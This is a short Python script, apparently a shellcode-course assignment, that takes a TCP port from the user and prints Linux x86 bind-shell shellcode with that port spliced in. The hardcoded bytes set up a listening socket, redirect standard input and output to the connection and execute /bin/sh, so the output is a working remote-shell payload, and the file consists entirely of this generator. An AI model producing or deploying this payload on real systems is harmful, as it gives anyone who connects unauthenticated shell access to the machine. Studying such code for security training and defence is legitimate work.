#coding:utf-8
"""
Filename:      bind_tcp_shell_gen.py
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  05.12.2018
Note:          Python 3 - Bind TCP shellcode generator

"""

import sys
import struct

shellcode_begin = "\\x31\\xc0\\x50\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x31\\xc0\\x50\\x66\\xb8"
shellcode_end = "\\x0f\\xc8\\x83\\xc0\\x02\\x50\\x89\\xe1\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x02\\x6a\\x10\\x51\\x52\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x50\\xb0\\x66\\x31\\xdb\\xb3\\x04\\x52\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x50\\x50\\xb0\\x66\\x31\\xdb\\xb3\\x05\\x52\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x31\\xc0\\xb0\\x3f\\x89\\xd3\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xd3\\x31\\xc9\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xd3\\x31\\xc9\\xb1\\x02\\xcd\\x80\\x31\\xc0\\x50\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
shellcode_port = ""
input_error = "!!! TCP port must be a number between 1 and 65535 !!!"
nullbyte_error = "The TCP port contain null byte, try another one!"

# Input port number and validation
input = input("Enter TCP port number (1-65535):")
try:
    port = int(input)
    if port < 1 or port > 65535:
        sys.exit(input_error)
except ValueError:
    sys.exit(input_error)

# Convert integer port number to hex string (little-endian) and verify for nullbyte
for x in struct.pack('<H', port):
    if x == 0:
        sys.exit(nullbyte_error)
    shellcode_port += '\\x'
    shellcode_port += '%02x' % x

print("-" * 90)
print("Shellcode:")
print("-" * 90)
print(shellcode_begin + shellcode_port + shellcode_end)
print("-" * 90)
